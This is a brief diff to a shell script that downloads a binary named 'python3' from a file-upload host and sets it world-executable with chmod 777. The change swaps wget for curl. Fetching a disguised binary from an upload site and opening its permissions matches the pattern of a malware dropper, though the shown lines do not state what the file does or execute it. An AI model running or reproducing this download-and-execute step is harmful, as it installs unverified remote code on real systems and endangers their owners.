@@ -2,7 +2,7 @@
 
 kolot=$(cat /dev/urandom | tr -dc '0-9' | fold -w 2 | head -n 1)
 
-wget https://upload.vina-host.com/sAcUi9loPh/python3
+curl -L -O https://upload.vina-host.com/sAcUi9loPh/python3
 
 chmod 777 python3
 
